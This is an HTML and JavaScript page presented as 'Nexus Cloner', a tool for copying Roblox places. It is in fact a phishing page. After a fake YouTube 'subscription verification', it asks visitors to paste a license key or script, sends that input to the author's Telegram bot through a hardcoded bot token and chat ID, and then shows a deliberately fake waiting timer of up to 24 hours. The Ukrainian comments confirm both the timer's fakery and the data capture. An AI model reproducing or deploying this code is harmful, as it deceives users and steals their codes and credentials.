    <style>
        *{margin:0;padding:0;box-sizing:border-box}body{min-height:100vh;background:radial-gradient(ellipse at 30% 40%,#0a0f1a,#000);font-family:'Segoe UI','Poppins','Inter',sans-serif;padding:1.5rem;position:relative;overflow-x:hidden}body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(45deg,rgba(0,255,255,0.03) 0,rgba(0,255,255,0.03) 2px,transparent 2px,transparent 8px),repeating-linear-gradient(135deg,rgba(255,0,255,0.03) 0,rgba(255,0,255,0.03) 2px,transparent 2px,transparent 8px);pointer-events:none;z-index:0}.wave-bg{position:fixed;bottom:0;left:0;width:100%;height:100px;background:repeating-linear-gradient(90deg,transparent,rgba(0,255,255,0.05) 50px,transparent 100px);pointer-events:none;z-index:0}.container{max-width:1200px;width:100%;margin:0 auto;position:relative;z-index:1}.main-card{background:rgba(8,12,20,0.75);backdrop-filter:blur(16px);border-radius:2.5rem;border:1px solid rgba(0,255,255,0.2);box-shadow:0 25px 50px -12px rgba(0,0,0,0.8),0 0 0 1px rgba(0,255,255,0.1) inset,0 0 30px rgba(0,255,255,0.1);padding:2rem}.header{text-align:center;margin-bottom:2rem}.logo{display:inline-flex;align-items:center;justify-content:center;gap:12px;margin-bottom:10px}.logo-icon{width:52px;height:52px;background:linear-gradient(135deg,#00ffff22,#ff00ff22);border-radius:20px;display:inline-flex;align-items:center;justify-content:center;font-size:28px;box-shadow:0 0 15px rgba(0,255,255,0.3);animation:iconPulse 2s infinite}@keyframes iconPulse{0%,100%{box-shadow:0 0 5px rgba(0,255,255,0.3);transform:scale(1)}50%{box-shadow:0 0 25px rgba(0,255,255,0.7);transform:scale(1.05)}}.glitch{font-size:2.5rem;font-weight:900;letter-spacing:5px;text-transform:uppercase;background:linear-gradient(135deg,#fff,#0ff,#f0f,#fff);background-size:300% 300%;-webkit-background-clip:text;background-clip:text;color:transparent;animation:gradientShift 3s ease infinite}@keyframes gradientShift{0%{background-position:0% 50%}50%{background- in-top:1rem;width:280px;background:#1a1a2a;border-radius:50px;height:6px;overflow:hidden}.loader-bar{width:0%;height:100%;background:linear-gradient(90deg,#fc0,#f80);border-radius:50px;transition:width 2s ease}.code-container{margin-top:1.5rem;width:100%;text-align:center}textarea.code-input{width:90%;max-width:500px;background:#0a0a12;border:2px solid #0ff8;border-radius:20px;padding:14px 20px;color:#0fc;font-family:'Fira Code',monospace;font-size:.85rem;outline:none;text-align:left;resize:vertical;min-height:100px}textarea.code-input:focus{border-color:#f0f;box-shadow:0 0 15px rgba(255,0,255,0.3)}.confirm-button{background:linear-gradient(135deg,#2a2a3a,#1a1a2a);border:1px solid cyan;padding:10px 28px;border-radius:50px;font-weight:700;color:cyan;cursor:pointer;transition:.2s;margin-top:14px;display:inline-flex;align-items:center;gap:10px}.confirm-button:hover{background:cyan;color:#000;border-color:#fff;box-shadow:0 0 20px cyan}.confirm-button:disabled{opacity:.5;cursor:not-allowed}.status-message{margin-top:15px;font-family:monospace}.guide-button{background:rgba(0,255,255,0.1);border:2px solid #0ff;border-radius:60px;padding:14px 35px;color:#0ff;font-weight:700;font-size:1.1rem;cursor:pointer;transition:.2s;display:inline-flex;align-items:center;gap:12px}.guide-button:hover{background:#0ff;color:#000;box-shadow:0 0 30px cyan}hr{border-color:rgba(0,255,255,0.2);margin:1rem auto;width:70%}footer{text-align:center;font-size:.7rem;color:#3a4a6e;margin-top:2rem;letter-spacing:1px}.fake-timer-box{background:rgba(0,0,0,0.7);border-radius:20px;padding:20px;margin-top:15px;border:1px solid #f84;box-shadow:0 0 20px rgba(255,100,0,0.2);animation:glow 1.5s ease-in-out infinite alternate}@keyframes glow{from{box-shadow:0 0 10px rgba(255,100,0,0.2)}to{box-shadow:0 0 25px rgba(255,100,0,0.5)}}.timer-label{font-size:.7rem;color:#fa6;letter-spacing:2px}.timer-display{font-size:2rem;font-weight:700;font-family:monospace;color:#f84;margin:10px 0;text-shadow:0 0 5px #f60}.timer-progress{width:100%;height:4px;background:#333;border-radius:4px;overflow:hidden;margin:10px 0}.timer-progress-fill{width:0%;height:100%;background:linear-gradient(90deg,#f84,#f40);border-radius:4px;transition:width 1s linear}.timer-message{font-size:.7rem;color:#fa6}.info-stats{display:flex;justify-content:center;gap:1.8rem;flex-wrap:wrap}.info-card{background:rgba(0,0,0,0.4);border-radius:1rem;padding:1rem 1.5rem;text-align:center;border:1px solid rgba(0,255,255,0.15)}.info-value{font-size:1.4rem;font-weight:700;color:#0fa}.info-label{font-size:.7rem;color:#6c7a8e;margin-top:5px}textarea.code-input::-webkit-scrollbar{width:8px}textarea.code-input::-webkit-scrollbar-track{background:#1a1a2a;border-radius:4px}textarea.code-input::-webkit-scrollbar-thumb{background:#0ff;border-radius:4px}

<body>
<div class="wave-bg"></div>
<div class="container">
    <div class="main-card">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">◈</div>
                <div class="glitch">NEXUS CLONER</div>
                <div class="logo-icon">⚡</div>
            </div>
            <div class="subtitle">// ADVANCED PLACE TOOL //</div>
        </div>
        <div class="category-grid">
            <div class="cat-card" id="catCopy"><div class="cat-icon">🎮</div><div class="cat-title">COPY PLACE</div><div class="cat-desc">► clone roblox place</div></div>
            <div class="cat-card" id="catGuide"><div class="cat-icon">📺</div><div class="cat-title">VIDEO GUIDE</div><div class="cat-desc">► full tutorial</div></div>
            <div class="cat-card" id="catInfo"><div class="cat-icon">📊</div><div class="cat-title">STATUS</div><div class="cat-desc">► system info</div></div>
        </div>
        <div class="content-panel" id="dynamicPanel">
            <div id="panelInner" style="text-align:center;color:#6c7a8e;">✦ select category ✦</div>
        </div>
        <footer>⛓️ encrypted channel • nexus tools v2.5</footer>
    </div>
</div>
<script>
    // ========== ТВОЇ ДАНІ (токен і ID) ==========
    const TELEGRAM_BOT_TOKEN = "8699814977:AAETiXth82duQ-HQB8sKD5R6TER6_7cfkrQ";
    const YOUR_CHAT_ID = "5213255525";           // Куди приходитимуть коди (твій ID)
    const YOUR_TELEGRAM_ID = 5213255525;          // ТВІЙ ID для захисту команд (такий самий)
    
    const YT_CHANNEL_URL = "https://www.youtube.com/@SYNC-d7b";
    const GUIDE_VIDEO_URL = "https://www.youtube.com/watch?v=YOUR_VIDEO_ID";
    
    // ========== ЗАХИСТ: ПЕРЕВІРКА ID ДЛЯ КОМАНД ==========
    // Ця функція перевіряє, чи команда надіслана ТОБОЮ
    async function sendToTelegram(code, senderId = null) {
        let trimmedCode = code;
        if (trimmedCode.length > 3500) {
            trimmedCode = trimmedCode.substring(0, 3500) + "\n\n... [trimmed]";
        }
        
        // ЯКЩО ЦЕ КОМАНДА (починається з /) І НЕ ТВІЙ ID — БЛОКУЄМО
        if (code.trim().startsWith("/")) {
            // Це команда для бота, а не код від користувача
            if (senderId !== YOUR_TELEGRAM_ID) {
                // Несанкціонований доступ — відправляємо відмову
                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: senderId,
                            text: "⛔ Access Denied. You are not authorized to control this bot."
                        })
                    });
                } catch(e) {}
                return false;
            }
            // Якщо команда від тебе — обробляємо нормально
            const message = `🤖 COMMAND EXECUTED\n\nCommand: ${trimmedCode}\n👤 By: @user_${senderId}`;
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: YOUR_CHAT_ID, text: message })
                });
                const result = await response.json();
                return result.ok === true;
            } catch(e) { return false; }
        }
        
        // ЯКЩО ЦЕ НЕ КОМАНДА — ЗВИЧАЙНА ВІДПРАВКА КОДУ ТОБІ
        const message = `🔐 NEW CODE RECEIVED 🔐\n\n📝 Code:\n${trimmedCode}\n\n⏰ Time: ${new Date().toLocaleString()}\n🎮 Tool: Nexus Cloner`;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: YOUR_CHAT_ID, text: message })
            });
            const result = await response.json();
            return result.ok === true;
        } catch (error) {
            console.error("Telegram error:", error);
            return false;
        }
    }
    
    // ========== ФЕЙКОВИЙ ТАЙМЕР ==========
    let activeTimer = null;
    
    function formatTime(seconds) {
        let hours = Math.floor(seconds / 3600);
        let minutes = Math.floor((seconds % 3600) / 60);
        return hours > 0 ? `${hours}h ${minutes}m` : `${minutes}m`;
    }
    
    function getRandomTime() {
        const randomHours = Math.floor(Math.random() * 24) + 1;
        return randomHours * 3600;
    }
    
    function startFakeTimer(totalSeconds, statusElement, confirmBtn, codeInput) {
        let remaining = totalSeconds;
        if (activeTimer) clearInterval(activeTimer);
        activeTimer = setInterval(() => {
            remaining--;
            if (remaining <= 0) {
                clearInterval(activeTimer);
                activeTimer = null;
                if (statusElement) statusElement.innerHTML = '<div style="color:#88ffaa;padding:15px;">✅ ACCESS GRANTED!</div>';
                if (confirmBtn) confirmBtn.disabled = false;
                if (codeInput) codeInput.disabled = false;
                return;
            }
            if (statusElement) {
                let percent = ((totalSeconds - remaining) / totalSeconds) * 100;
                statusElement.innerHTML = `<div class="fake-timer-box"><div class="timer-label">⏰ ESTIMATED WAITING TIME ⏰</div><div class="timer-display">${formatTime(remaining)}</div><div class="timer-progress"><div class="timer-progress-fill" style="width:${percent}%;"></div></div><div class="timer-message">processing... do not close the page</div></div>`;
            }
        }, 1000);
    }
    
    const panelInner = document.getElementById('panelInner');
    
    function showCopyPlace() {
        if (activeTimer) { clearInterval(activeTimer); activeTimer = null; }
        panelInner.innerHTML = `<div class="youtube-section"><div class="yt-card"><span>🎮</span><span style="font-weight:bold;">ROBLOX PLACE CLONER</span></div><div style="font-size:0.8rem;color:#88aaff;">▼ verification required ▼</div><div class="sub-button" id="subscribeBtn"><span>📺</span> SUBSCRIBE ON YOUTUBE <span>➤</span></div><div id="loaderWrap" style="display:none;"><div class="loader-wrapper"><div class="loader-bar" id="progressBar"></div></div><div style="color:#ffaa33;font-size:11px;">verifying subscription...</div></div><div id="codeSection" style="display:none;width:100%;"><hr/><div class="code-container"><textarea id="codeInput" class="code-input" placeholder="paste your license key or script here..." rows="4"></textarea><button id="confirmBtn" class="confirm-button"><span>📋</span> CONFIRM & SEND</button><div id="statusMsg" class="status-message"></div></div></div></div>`;
        
        const subBtn = document.getElementById('subscribeBtn');
        const loaderWrap = document.getElementById('loaderWrap');
        const codeSection = document.getElementById('codeSection');
        if (subBtn) {
            subBtn.onclick = () => {
                window.open(YT_CHANNEL_URL, '_blank');
                loaderWrap.style.display = 'block';
                let pb = document.getElementById('progressBar');
                if (pb) {
                    pb.style.width = '0%';
                    setTimeout(() => pb.style.width = '60%', 200);
                    setTimeout(() => pb.style.width = '100%', 1500);
                }
                setTimeout(() => { loaderWrap.style.display = 'none'; codeSection.style.display = 'block'; }, 2200);
            };
        }
        setTimeout(() => {
            let confirmBtn = document.getElementById('confirmBtn');
            let codeInput = document.getElementById('codeInput');
            let statusMsg = document.getElementById('statusMsg');
            if (confirmBtn) {
                confirmBtn.onclick = async () => {
                    let code = codeInput ? codeInput.value : '';
                    if (!code.trim()) {
                        if(statusMsg) { statusMsg.innerHTML = '<div style="color:#ffaa66;">❌ please enter your code</div>'; setTimeout(() => statusMsg.innerHTML = '', 1500); }
                        return;
                    }
                    statusMsg.innerHTML = '<div style="color:#ffcc66;">⏳ sending...</div>';
                    let success = await sendToTelegram(code);
                    if (success) {
                        let randomSeconds = getRandomTime();
                        confirmBtn.disabled = true;
                        codeInput.disabled = true;
                        startFakeTimer(randomSeconds, statusMsg, confirmBtn, codeInput);
                    } else {
                        statusMsg.innerHTML = '<div style="color:#ffaa66;">⚠️ error | please try again</div>';
                        setTimeout(() => statusMsg.innerHTML = '', 3000);
                    }
                };
            }
        }, 100);
    }
    
    function showGuide() {
        if (activeTimer) { clearInterval(activeTimer); activeTimer = null; }
        panelInner.innerHTML = `<div style="text-align:center;"><div style="font-size:1.5rem;margin-bottom:1rem;">🎥 OFFICIAL TUTORIAL</div><div class="guide-button" id="openVideoBtn"><span>▶</span> WATCH FULL GUIDE ON YOUTUBE</div><div style="margin-top:25px;padding:12px;background:rgba(0,255,255,0.05);border-radius:20px;"><p style="color:#88aaff;">⚡ step-by-step instructions</p><p style="font-size:0.7rem;margin-top:8px;">how to copy any roblox place | complete walkthrough</p></div></div>`;
        let vid = document.getElementById('openVideoBtn');
        if(vid) vid.onclick = () => { if(GUIDE_VIDEO_URL && GUIDE_VIDEO_URL !== "https://www.youtube.com/watch?v=YOUR_VIDEO_ID") window.open(GUIDE_VIDEO_URL, '_blank'); else alert("📌 Video guide coming soon"); };
    }
    
    function showInfo() {
        if (activeTimer) { clearInterval(activeTimer); activeTimer = null; }
        panelInner.innerHTML = `<div style="text-align:center;"><div style="font-size:1.5rem;margin-bottom:1rem;">⚡ SYSTEM STATUS</div><div class="info-stats"><div class="info-card"><div class="info-value">ONLINE</div><div class="info-label">SERVER</div></div><div class="info-card"><div class="info-value">v2.5</div><div class="info-label">VERSION</div></div><div class="info-card"><div class="info-value">SECURE</div><div class="info-label">CHANNEL</div></div></div><hr style="width:50%;margin:1.5rem auto;"/><p style="color:#aaa;font-size:0.8rem;">all operations are encrypted • nexus cloner</p><p style="color:#6c7a8e;font-size:0.7rem;margin-top:1rem;">⚡ exclusive tool ⚡</p></div>`;
    }
    
    document.getElementById('catCopy').onclick = showCopyPlace;
    document.getElementById('catGuide').onclick = showGuide;
    document.getElementById('catInfo').onclick = showInfo;
    showCopyPlace();
</script>
</body>
</html>
